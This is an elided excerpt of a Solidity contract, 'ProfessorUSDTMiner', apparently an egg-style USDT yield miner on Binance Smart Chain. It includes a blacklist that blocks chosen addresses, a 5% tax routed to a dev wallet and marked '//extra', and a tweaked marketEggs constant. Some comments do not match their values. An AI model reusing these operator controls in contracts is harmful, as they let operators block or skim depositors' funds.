...
contract ProfessorUSDTMiner {
using SafeMath for uint256;

IToken public token_BUSD;
address erctoken = 0x55d398326f99059fF775485246999027B3197955; // BINANCE BSC USD TOKEN ADDRESS
// address erctoken = 0xD7E7330Fa43786e8f1D2d797F568D422eD7799F5; // TESTNET---BINANCE BSC USD TOKEN ADDRESS



uint256 public EGGS_TO_HIRE_1MINERS = 1728000; //5%
uint256 public PERCENTS_DIVIDER = 1000;
uint256 public REFERRAL = 200; //20%
uint256 public TAX = 50; ///5% buy and on sell both
uint256 public MARKET_EGGS_DIVISOR = 2; // 50%
uint256 public MARKET_EGGS_DIVISOR_SELL = 1; // 100%

uint256 public MIN_INVEST_LIMIT = 1 * 1e18; /** 1 USDt **/
uint256 public WALLET_DEPOSIT_LIMIT = 1000 * 1e18; /** 1000 USDT **/
...
uint256 public WITHDRAWAL_TAX = 5; //0.05
...
require(!blacklist[msg.sender], "Please reach out to our Support team as you are prohibited from utilizing this contract");
...
// Calculate the 5% tax amount
uint256 taxAmount = eggValue.mul(5).div(100);

token_BUSD.transfer(dev1,taxAmount); //extra
// uint256 eggsPayout = eggValue.sub(payFees(eggValue));
uint256 eggsPayout = eggValue.sub(taxAmount);
...
marketEggs = 172800000000; ///EXTRA ZEROS 864000 00000
...
// USDT TESTNET: 0xD7E7330Fa43786e8f1D2d797F568D422eD7799F5